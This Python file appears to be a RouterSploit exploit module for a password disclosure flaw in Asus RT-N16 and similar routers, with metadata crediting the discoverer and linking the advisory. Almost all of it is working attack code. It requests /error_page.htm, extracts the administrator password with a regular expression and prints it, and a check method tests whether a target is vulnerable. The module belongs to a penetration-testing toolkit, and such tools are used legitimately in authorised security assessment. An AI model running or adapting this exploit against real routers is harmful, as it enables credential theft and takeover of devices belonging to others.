import re

from routersploit import (
    exploits,
    print_error,
    print_success,
    print_table,
    http_request,
    mute,
    validators,
)


class Exploit(exploits.Exploit):
    """
    Exploit implementation for Asus RT-N16 Password Disclosure vulnerability.
    If the target is vulnerable it allows to read credentials for administrator.
    """
    __info__ = {
        'name': 'Asus RT-N16 Password Disclosure',
        'description': 'Module exploits password disclosure vulnerability in Asus RT-N16 devices that allows to fetch credentials for the device.',
        'authors': [
            'Harry Sintonen',  # vulnerability discovery
            'Marcin Bury <marcin.bury[at]reverse-shell.com>',  # routersploit module
        ],
        'references': [
            'https://sintonen.fi/advisories/asus-router-auth-bypass.txt'
        ],
        'devices': [
            'ASUS RT-N10U, firmware 3.0.0.4.374_168',
            'ASUS RT-N56U, firmware 3.0.0.4.374_979',
            'ASUS DSL-N55U, firmware 3.0.0.4.374_1397',
            'ASUS RT-AC66U, firmware 3.0.0.4.374_2050',
            'ASUS RT-N15U, firmware 3.0.0.4.374_16',
            'ASUS RT-N53, firmware 3.0.0.4.374_311',
        ],
    }

    target = exploits.Option('', 'Target address e.g. http://192.168.1.1', validators=validators.url)  # target address
    port = exploits.Option(8080, 'Target port')  # default port

    def run(self):
        url = "{}:{}/error_page.htm".format(self.target, self.port)

        response = http_request(method="GET", url=url)
        if response is None:
            return

        creds = re.findall("if\('1' == '0' \|\| '(.+?)' == 'admin'\)", response.text)

        if len(creds):
            c = [("admin", creds[0])]
            print_success("Credentials found!")
            headers = ("Login", "Password")
            print_table(headers, *c)
        else:
            print_error("Credentials could not be found")

    @mute
    def check(self):
        url = "{}:{}/error_page.htm".format(self.target, self.port)

        response = http_request(method="GET", url=url)
        if response is None:
            return False  # target is not vulnerable

        creds = re.findall("if\('1' == '0' \|\| '(.+?)' == 'admin'\)", response.text)

        if len(creds):
            return True  # target is vulnerable

        return False  # target is not vulnerable
